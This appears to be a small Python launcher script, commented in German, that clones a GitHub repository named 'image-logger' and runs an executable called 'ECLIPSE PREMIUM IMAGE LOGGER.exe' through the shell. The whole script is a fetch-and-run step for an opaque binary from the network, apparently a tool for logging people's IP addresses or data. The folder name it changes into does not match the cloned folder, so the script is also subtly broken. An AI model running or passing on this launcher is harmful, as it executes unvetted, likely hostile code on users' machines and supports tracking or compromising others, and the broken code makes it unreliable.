import os
import subprocess

# Git-Repository klonen
repo_url = "https://github.com/PsxDupingg/image-logger.git"
repo_folder = "image-loggerr"

if not os.path.exists(repo_folder):
    os.system(f"git clone {repo_url}")

# In den Repository-Ordner wechseln
os.chdir(repo_folder)

# Ausführbare Datei starten
exe_file = "ECLIPSE PREMIUM IMAGE LOGGER.exe"

if os.path.exists(exe_file):
    subprocess.run(exe_file, shell=True)
else:
    print(f"Fehler: Die Datei '{exe_file}' wurde nicht gefunden.")
